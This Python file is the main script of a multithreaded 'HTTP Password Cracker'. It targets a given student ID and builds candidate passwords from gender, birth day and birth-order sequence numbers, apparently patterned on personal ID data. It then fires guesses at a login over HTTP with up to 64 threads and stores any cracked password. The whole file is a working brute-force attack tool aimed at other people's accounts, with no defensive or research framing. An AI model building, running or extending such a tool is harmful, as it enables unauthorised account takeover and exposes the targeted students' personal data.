import argparse
import concurrent.futures
import logging
import os
import queue
import sys
import threading
import time

from src.core.database import (
    db_updater_loop,
    get_progress_map,
    init_db,
    save_success,
)
from src.core.generator import generate_dictionary_file, load_tasks_from_file
from src.core.worker import worker

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("HTTP_Cracker")

# Global control flags
stop_event = threading.Event()
progress_queue = queue.Queue()


def main():
    parser = argparse.ArgumentParser(
        description="High-Performance HTTP Password Cracker"
    )
    parser.add_argument("username", help="Target Student ID")
    parser.add_argument(
        "--gender",
        "-g",
        choices=["M", "F", "ALL"],
        default="ALL",
        help="Gender (M/F/ALL)",
    )
    parser.add_argument("--day", "-d", help="Specific day (01-31)")

    parser.add_argument(
        "--max-seq",
        "-s",
        type=int,
        default=500,
        help="Maximum sequence number for birth order (default: 500)",
    )

    parser.add_argument(
        "--threads", "-t", type=int, default=64, help="Number of threads (default: 64)"
    )

    args = parser.parse_args()

    # Init DB
    conn = init_db()

    # Check if password already exists
    cursor = conn.cursor()
    cursor.execute(
        "SELECT password FROM found_passwords WHERE username = ?", (args.username,)
    )
    found = cursor.fetchone()
    if found:
        logger.info(f"✅ Password already found in database: {found[0]}")
        save_success(args.username, found[0])  # Ensure CSV is synced
        conn.close()
        return

    progress = get_progress_map(conn, args.username)
    if progress:
        logger.info(f"[*] Resuming: Found progress for {len(progress)} days.")
        logger.info("    (Skipping already tested passwords...)")
    else:
        logger.info("[*] No saved progress found. Starting from scratch.")
    conn.close()

    # Start DB Updater Thread (non-daemon to ensure cleanup)
    db_thread = threading.Thread(
        target=db_updater_loop, args=(progress_queue,), daemon=False
    )
    db_thread.start()

    # Generate password dictionary
    # Use username-specific dict file to avoid conflicts
    dict_file = f"passwords_{args.username}.txt"
    logger.info(f"Generating full candidate list: {dict_file} ...")

    total_tasks = generate_dictionary_file(
        dict_file,
        gender=args.gender,
        specific_day=args.day,
        max_seq=args.max_seq,
    )

    if total_tasks == 0:
        logger.info("No passwords to test (Check filters).")
        # Ensure DB thread closes if we return early
        progress_queue.put(None)
        db_thread.join()
        return

    logger.info(
        f"[*] Target: {args.username} | Gender: {args.gender} | Dict Size: {total_tasks}"
    )
    logger.info(f"[*] Threads: {args.threads} | Mode: Pure HTTP")

    start_time = time.time()

    # Executor
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=args.threads)
    futures = []
    completed = 0  # Initialize here for scope safety

    try:
        # Load tasks lazily from file
        task_gen = load_tasks_from_file(dict_file, progress)

        try:
            for password, day_key in task_gen:
                if stop_event.is_set():
                    break
                future = executor.submit(
                    worker, stop_event, progress_queue, args.username, password, day_key
                )
                futures.append(future)
        except KeyboardInterrupt:
            logger.info("Stopping submission...")
            stop_event.set()

        # Monitor Loop
        try:
            for _ in concurrent.futures.as_completed(futures):
                if stop_event.is_set():
                    break

                completed += 1
                if completed % 100 == 0:
                    elapsed = time.time() - start_time
                    speed = completed / elapsed if elapsed > 0 else 0
                    sys.stdout.write(
                        f"\r[*] Progress: {completed}/{total_tasks} | Speed: {speed:.1f} req/s"
                    )
                    sys.stdout.flush()
        except KeyboardInterrupt:
            logger.info("\nStopping...")
            stop_event.set()

    finally:
        if stop_event.is_set():
            executor.shutdown(wait=False, cancel_futures=True)
        else:
            executor.shutdown(wait=True)

        # Send sentinel to DB thread to signal completion
        logger.info("Sending sentinel to DB thread...")
        progress_queue.put(None)

    # Ensure DB thread finishes
    stop_event.set()  # Just in case
    logger.info("Waiting for database sync...")
    db_thread.join()

    # Cleanup dictionary file
    if os.path.exists(dict_file):
        try:
            os.remove(dict_file)
            logger.info("Temporary dictionary file cleaned up.")
        except Exception as e:
            logger.warning(f"Failed to remove temp file: {e}")

    print()  # Newline
    duration = time.time() - start_time
    logger.info(f"Finished in {duration:.2f} seconds.")
    if total_tasks > 0:
        logger.info(
            f"Tasks processed: {completed} / Total Dict: {total_tasks} (Skipped: {total_tasks - completed})"
        )


if __name__ == "__main__":
    main()
